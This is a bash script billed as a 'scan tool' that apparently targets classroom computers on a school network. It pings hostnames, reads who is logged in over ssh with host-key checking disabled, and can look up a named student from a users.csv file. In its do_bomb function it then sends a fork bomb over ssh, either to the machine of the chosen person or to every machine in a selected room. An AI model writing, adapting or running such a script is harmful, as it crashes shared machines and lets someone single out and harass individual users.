#!/bin/bash

declare -r ARGS=$("$@")
declare -a USERS_LIST=()
declare -a CLASSROOM_LIST=(DI-727 DI-729 DI-716 DI-718 DI-715 DI-720 DI-722 DI-725 DI-712)
declare -a CLASSROOM_PCS=()

main () {
	clear

	echo 'Welcome to scan tool !'
	echo

	eval `ssh-agent -s` > /dev/null
	eval `ssh-add ~/.ssh/id_rsa`

	select choice in "Search by class" "Search by name"; do
		case $choice in
			"Search by class")
				search_byclass
				break
				;;

			"Search by name")
				search_byname
				break
				;;
		esac
	done

	exit
}

search_byname () {
	declare -a search_results=()
	declare -i search_results_number=0

	load_users

	while [ -z "$search" ]; do
		echo
		echo "Type to search in database (${#USERS_LIST[@]} entries)"
		echo -n 'search : '
		read search
	done

	for user in "${USERS_LIST[@]}"; do
		if [[ "${user}" =~ "${search}" ]]; then
			search_results+=($user)
		fi
	done

	search_results_number=${#search_results[@]}

	echo
	if [ $search_results_number -eq 0 ]; then
		echo "No result found."

	else
		echo "$search_results_number results found :)"
		echo
		echo 'Select right person : '

		select choice in "${search_results[@]}"; do
			taget_user=$choice
			break
		done

		echo
		echo "Selected target person : $taget_user."
		echo

		taget_user=${taget_user%%_*}

		for mask_class_ip in "${CLASSROOM_LIST[@]}"; do
			it=0
			echo "Begin scan > $mask_class_ip-0/30."

			while [ $it -lt 40 ]; do

				if [ $it -lt 10 ]; then
					current_mask_test="$mask_class_ip-0$it"
				else
					current_mask_test="$mask_class_ip-$it"
				fi

				ping -q -c 1 $current_mask_test > /dev/null 2> /dev/null
				result=$(echo $?)

				if [ $result -eq 0 ]; then
					echo " > online $current_mask_test"

					return_cmd=$(get_connectedUser_byComputer $current_mask_test)

					if [[ -z "$return_cmd" ]]; then
						return_cmd="__nobody__"
					fi

					return_cmd=${return_cmd//;/$'\n'}
					for user in $return_cmd; do
						echo "   > $user : $taget_user"

						if [ "$user" = "$taget_user" ]; then
							echo "   > User $target_user found on $current_mask_test :D"
							do_bomb $current_mask_test

							break 2
						fi
					done
				fi

				it=$((it+1))
			done

			echo 'Done scan.'
			echo
		done

	fi
}

search_byclass () {
	while [ -z "$mask_class_ip" ]; do
   	echo
	 	echo 'Which zone of ips want you scan (ex. DI-694) ?'
	 	echo -n 'class : '
	 	read mask_class_ip
	done

	echo

	scan_classroom $mask_class_ip
	remove_undesired
	do_connect
}

get_connectedUser_byComputer () {
	connect_adress=$1
	#ssh-keygen -R $connect_adress > /dev/null 2> /dev/null
	return_cmd=$(ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $connect_adress "w -h -s -f | cut -d' ' -f1 | tr '\r\n' ';';exit")

	echo ${return_cmd%?}
}

load_users () {
	while IFS=";" read lastname firstname group id photo; do
		USERS_LIST+=("${id}_${lastname}_${firstname}_${group}")
		((it+=1))
	done < "users.csv"
}

scan_classroom () {
	mask_class_ip=$1
	it=0

	echo "Begin scan > $mask_class_ip-0/30."

	while [ $it -lt 35 ]; do

		if [ $it -lt 10 ]; then
			current_mask_test="$mask_class_ip-0$it"
		else
			current_mask_test="$mask_class_ip-$it"
		fi

		ping -q -c 1 $current_mask_test > /dev/null 2>$1
		result=$(echo $?)

		if [ $result -eq 0 ]; then
			CLASSROOM_PCS+=($current_mask_test)
			echo " > online $current_mask_test"
		fi

		it=$((it+1))
	done

	echo 'Done scan.'
	echo
}

remove_undesired () {
	continue_delete=true
	echo "Wich one want you delete ?"

	while [ "$continue_delete" = true ]; do
		declare -a new_array=(none ${CLASSROOM_PCS[@]})

		PS3="Another deletion : "
		select to_delete in ${new_array[@]}; do

			if [ "$to_delete" == none ]; then
				continue_delete=false
				echo "Done deleting."

			else
				echo "Delting $to_delete..."

				declare -i it=0
				for entry in "${CLASSROOM_PCS[@]}"; do
					if [ "$entry" == "$to_delete" ]; then

						if [ $it == 0 ]; then
							CLASSROOM_PCS=(${CLASSROOM_PCS[@]:1:${#CLASSROOM_PCS[@]}})
						else
							if [ $it == ${#CLASSROOM_PCS[@]} ]; then
								CLASSROOM_PCS=(${CLASSROOM_PCS[@]:0:$it})
							else
								CLASSROOM_PCS=(${CLASSROOM_PCS[@]:0:$it} ${CLASSROOM_PCS[@]:((it + 1)):${#CLASSROOM_PCS[@]}})
							fi
						fi

						break
					fi

					((it++))
				done
			fi

			break
		done

		echo
	done
}

do_connect () {
	# Browse targets
	for target in "${CLASSROOM_PCS[@]}"; do
		# do job
		do_bomb $target
	done
	echo

	# Self bomb
	#echo "enjoy :)"
	#for go in 10 9 8 7 6 5 4 3 2 1 0; do
	#	echo $go
	#	sleep 1s
	#done

	# self job
	#do_bomb localhost
}

do_bomb () {
	current_target=$1
	connect_adress="$current_target"

	ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $connect_adress ":(){ sleep 4 && :|: & };:;exit" & > /dev/null 2>$1
	echo "   > Atomized $current_target."
}

main
